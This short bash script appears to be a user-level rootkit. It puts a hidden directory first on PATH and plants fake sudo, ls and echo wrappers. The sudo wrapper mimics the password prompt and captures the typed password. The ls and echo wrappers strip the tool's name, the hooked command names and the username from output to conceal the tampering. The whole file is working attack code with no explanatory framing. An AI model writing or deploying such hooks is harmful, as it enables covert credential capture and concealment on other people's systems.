#!/bin/bash

PATH=~/raptor:$PATH

mkdir ~/raptor

#Hook sudo
echo "#!/bin/bash" > ~/raptor/sudo
echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/raptor/sudo
echo "echo \$p | /usr/bin/sudo -S \$@" >> ~/raptor/sudo
chmod +x ~/raptor/sudo

#Hook ls
echo "#!/bin/bash" > ~/raptor/ls
echo "/bin/ls -C --color=always \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | cat" >> ~/raptor/ls
chmod +x ~/raptor/ls

#Hook echo
echo "#!/bin/bash" > ~/raptor/echo
echo "/bin/echo $@ | sed s/$(whoami)//g" >> ~/raptor/echo
chmod +x ~/raptor/echo

exec bash
